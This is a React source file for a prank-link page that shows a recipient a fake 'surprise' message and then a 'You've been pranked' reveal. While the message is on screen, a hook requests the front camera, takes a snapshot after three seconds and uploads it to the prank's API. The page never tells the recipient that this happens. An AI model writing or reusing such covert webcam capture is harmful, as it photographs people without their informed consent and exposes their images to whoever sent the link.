// src/pages/PrankExecutionPage.tsx - FULLY FUNCTIONAL PRANK PAGE
import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'motion/react';
import { soundManager } from '../utils/soundManager';
import { ArrowLeft, RefreshCw, Swords } from 'lucide-react';
import MarqueeHeader from '../components/MarqueeHeader';

interface PrankData {
  id: string;
  prankType: string;
  title: string;
  message: string;
  revealMessage: string;
  creatorName: string;
  creatorUsername: string;
  photoUrl?: string;
  photoExpiresAt?: string;
}

export default function PrankExecutionPage() {
  const { id } = useParams();
  const navigate = useNavigate();
  const [step, setStep] = useState<'loading' | 'box' | 'content' | 'revealed' | 'error'>('loading');
  const [prankData, setPrankData] = useState<PrankData | null>(null);
  const [error, setError] = useState('');
  const [isOpening, setIsOpening] = useState(false);
  const [contentRead, setContentRead] = useState(false);
  const [photoLoaded, setPhotoLoaded] = useState(false);

  useEffect(() => {
    if (id) {
      fetch(`/api/prank/${id}`)
        .then(res => {
          if (!res.ok) throw new Error('Prank not found');
          return res.json();
        })
        .then(data => {
          console.log('Prank data received:', data);
          console.log('Photo URL:', data.photoUrl);
          setPrankData(data);
          setStep('box');
        })
        .catch(err => {
          setError(err.message);
          setStep('error');
        });
    }
  }, [id]);

  useEffect(() => {
    if (step === 'content') {
      const captureReaction = async () => {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
          const video = document.createElement('video');
          video.srcObject = stream;
          await video.play();

          // Wait 3 seconds to capture their facial reaction while they read
          setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d')?.drawImage(video, 0, 0);
            const imageBase64 = canvas.toDataURL('image/jpeg');

            fetch(`/api/v2/pranks/${id}/reaction`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ imageBase64 })
            });

            stream.getTracks().forEach(track => track.stop());
          }, 3000);
        } catch (e) {
          console.log('Camera permission denied or not available');
        }
      };
      
      captureReaction();
    }
  }, [step, id]);
  const isPhotoValid = () => {
    if (!prankData?.photoUrl) return false;
    if (prankData.photoExpiresAt) {
      return new Date(prankData.photoExpiresAt) > new Date();
    }
    return true;
  };

  const openSurpriseBox = () => {
    setIsOpening(true);
    setTimeout(() => {
      setStep('content');
    }, 500);
  };

  const markAsRead = () => {
    setContentRead(true);
  };

  const revealPrank = () => {
    soundManager.playFaaah('loud');
    setStep('revealed');
    // Track completion
    fetch(`/api/prank/${id}/complete`, { 
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ victimIp: 'anonymous' })
    }).catch(() => {});
  };

  const prankBack = () => {
    navigate(`/prank?prankback=${prankData?.creatorName || ''}`);
  };

  const challengeFriendship = () => {
    navigate('/friendship');
  };

  const tryTruthOrDare = () => {
    navigate('/truthordare');
  };

  const getPrankIcon = () => {
    switch (prankData?.prankType) {
      case 'win_prize': return '🏆';
      case 'i_like_you': return '💕';
      case 'i_love_you': return '❤️';
      case 'you_owe_me': return '💰';
      case 'you_failed': return '❌';
      case 'you_are_welcomed': return '🎉';
      case 'invitation': return '📩';
      case 'my_crush': return '💘';
      default: return '🎁';
    }
  };

  if (step === 'loading') {
    return (
      <div className="min-h-screen bg-brutal-black flex items-center justify-center">
        <div className="text-center">
          <RefreshCw className="w-12 h-12 text-yellow-500 animate-spin mx-auto mb-4" />
          <p className="text-gallery-white/40 font-mono text-[10px] uppercase tracking-widest">Loading your surprise...</p>
        </div>
      </div>
    );
  }

  if (step === 'error') {
    return (
      <div className="min-h-screen bg-brutal-black flex flex-col items-center justify-center p-4">
        <div className="max-w-md w-full text-center">
          <div className="text-6xl mb-6 grayscale text-gallery-white/20">🎁</div>
          <h1 className="text-3xl font-black text-white mb-2 uppercase italic tracking-tighter">Prank Dismissed</h1>
          <p className="text-gallery-white/40 font-mono text-xs mb-8 uppercase tracking-widest leading-loose">{error || "This prank link is no longer active in our database."}</p>
          <button onClick={() => navigate('/prank')} className="w-full bg-yellow-500 text-brutal-black py-4 font-bold uppercase tracking-widest brutal-border hover:bg-white transition-all">
            Create Your Own Prank →
          </button>
        </div>
      </div>
    );
  }

  // Step 1: Surprise Box
  if (step === 'box') {
    return (
      <div className="min-h-screen bg-brutal-black flex flex-col items-center justify-center p-4">
        <MarqueeHeader />
        <div className="text-center mt-12">
          <motion.div
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            onClick={openSurpriseBox}
            className={`cursor-pointer transition-all duration-300 ${isOpening ? 'scale-150 opacity-0' : 'hover:scale-110'}`}
          >
            <div className="text-9xl mb-6 animate-bounce">🎁</div>
            <p className="text-white text-2xl font-black mb-2 uppercase italic italic">You've Got a Surprise!</p>
            <p className="text-gallery-white/40 font-mono text-xs uppercase tracking-widest">From: <span className="text-yellow-500">@{prankData?.creatorName || 'someone'}</span></p>
            <p className="text-neon-green font-mono text-[10px] mt-6 uppercase tracking-widest animate-pulse">Tap to open →</p>
          </motion.div>
        </div>
      </div>
    );
  }

  // Step 2: Prank Content
  if (step === 'content') {
    return (
      <div className="min-h-screen bg-brutal-black py-12 px-4 selection:bg-neon-green selection:text-brutal-black">
        <MarqueeHeader />
        <div className="max-w-2xl mx-auto text-center mt-12">
          <motion.div 
            initial={{ y: 20, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            className="bg-white/5 brutal-border p-12 mb-8 relative border-yellow-500/30"
          >
            <div className="absolute top-0 left-0 w-full h-1 bg-yellow-500" />
            <div className="text-8xl mb-6">{getPrankIcon()}</div>
            
            {isPhotoValid() && prankData?.photoUrl && (
              <div className="mb-6 flex justify-center">
                <div className="relative">
                  {!photoLoaded && (
                    <div className="absolute inset-0 flex items-center justify-center bg-white/5 brutal-border">
                      <RefreshCw className="animate-spin text-yellow-500" />
                    </div>
                  )}
                  <img 
                    src={prankData.photoUrl} 
                    alt="Prank" 
                    className={`w-48 h-48 rounded-full object-cover border-4 border-yellow-500/50 grayscale hover:grayscale-0 transition-all duration-500 ${photoLoaded ? 'opacity-100' : 'opacity-0'}`}
                    onLoad={() => setPhotoLoaded(true)}
                    onError={(e) => {
                      console.error('Photo failed to load:', prankData.photoUrl);
                      setPhotoLoaded(false);
                    }}
                  />
                </div>
              </div>
            )}

            <h1 className="text-4xl font-black text-white mb-6 uppercase italic tracking-tighter">{prankData?.title || 'Congratulations!'}</h1>
            <div className="bg-brutal-black border border-white/5 p-8 mb-8">
              <p className="text-white text-2xl leading-relaxed italic font-bold">
                "{prankData?.message || "You've been selected as the winner!"}"
              </p>
            </div>

            <AnimatePresence mode="wait">
              {!contentRead ? (
                <motion.button
                  key="read"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  onClick={markAsRead}
                  className="w-full bg-white text-brutal-black font-black py-5 rounded-none brutal-border hover:bg-neon-green hover:border-neon-green transition-all uppercase tracking-widest text-lg"
                >
                  👆 Tap Here After Reading 👆
                </motion.button>
              ) : (
                <motion.button
                  key="reveal"
                  initial={{ scale: 0.9, opacity: 0 }}
                  animate={{ scale: 1, opacity: 1 }}
                  onClick={revealPrank}
                  className="w-full bg-red-600 text-white font-black py-5 rounded-none brutal-border border-red-500 hover:bg-white hover:text-brutal-black transition-all uppercase tracking-widest text-lg animate-bounce"
                >
                  🔥 Click to Reveal the Truth 🔥
                </motion.button>
              )}
            </AnimatePresence>
          </motion.div>
        </div>
      </div>
    );
  }

  // Step 3: Revealed - "You have been pranked!"
  return (
    <div className="min-h-screen bg-brutal-black py-12 px-4 selection:bg-neon-green selection:text-brutal-black">
      <MarqueeHeader />
      <div className="max-w-2xl mx-auto text-center mt-12">
        <motion.div 
          initial={{ y: 20, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          className="bg-red-900/10 brutal-border border-red-500/50 p-12 mb-8 relative"
        >
          <div className="absolute top-0 left-0 w-full h-1 bg-red-500 shadow-[0_0_15px_#FF0000]" />
          
          <div className="text-9xl mb-6 animate-bounce">{isPhotoValid() && prankData?.photoUrl ? null : '😂'}</div>
          
          {isPhotoValid() && prankData?.photoUrl && (
            <div className="mb-6 flex justify-center">
              <img 
                src={prankData.photoUrl} 
                alt="Prank Revealed" 
                className="w-48 h-48 rounded-full object-cover border-4 border-red-500 shadow-[0_0_20px_rgba(255,0,0,0.4)]"
              />
            </div>
          )}

          <h1 className="text-5xl md:text-6xl font-black text-white mb-4 uppercase italic tracking-tighter">YOU'VE BEEN PRANKED!</h1>
          {prankData?.creatorName && (
            <p className="text-2xl text-yellow-500 font-mono uppercase tracking-[0.2em] mb-6">by @{prankData.creatorName}</p>
          )}
          <div className="bg-brutal-black border border-white/5 p-6 mb-2">
            <p className="text-gallery-white text-xl italic leading-relaxed">"{prankData?.revealMessage || "Just kidding! All in good fun."}"</p>
          </div>
        </motion.div>

        <div className="flex flex-col gap-4">
          <button onClick={prankBack} className="w-full bg-white text-brutal-black font-black py-5 uppercase tracking-widest brutal-border hover:bg-neon-green hover:border-neon-green transition-all flex items-center justify-center gap-3 text-lg">
             REVENGE: PRANK THEM BACK 🎭
          </button>
          <div className="grid grid-cols-2 gap-4">
            <button onClick={challengeFriendship} className="bg-white/5 text-white font-black py-4 uppercase tracking-widest border border-white/20 hover:border-white transition-all text-xs flex items-center justify-center gap-2">
              🤝 Friendship Challenge
            </button>
            <button onClick={tryTruthOrDare} className="bg-white/5 text-white font-black py-4 uppercase tracking-widest border border-white/20 hover:border-white transition-all text-xs flex items-center justify-center gap-2">
              🎲 Truth or Dare
            </button>
          </div>
          <button onClick={() => navigate('/')} className="text-gallery-white/20 font-mono text-[10px] uppercase tracking-widest hover:text-white transition-all py-4">
            ← Back to Home
          </button>
        </div>
      </div>
    </div>
  );
}
